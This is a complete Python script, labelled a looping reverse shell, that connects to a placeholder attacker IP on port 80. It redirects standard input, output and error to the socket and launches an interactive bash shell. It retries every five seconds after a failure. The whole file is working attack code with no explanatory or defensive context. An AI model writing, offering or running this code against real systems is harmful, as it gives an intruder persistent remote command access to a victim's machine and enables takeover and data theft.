import os
import socket
import subprocess
import time

'''
Looping reverse shell
'''
def main():
    ATTACKER_IP = '<ATTACKER_IP>'
    ATTACKER_LISTENING_PORT = 80

    counter = 0
    MAX_COUNTER = 100
    while counter < MAX_COUNTER:
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((ATTACKER_IP, ATTACKER_LISTENING_PORT))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            counter = 0
            subprocess.call(['/bin/bash', '-i'])
        except:
            counter += 1
            time.sleep(5)
            continue

if __name__ == '__main__':
    main()
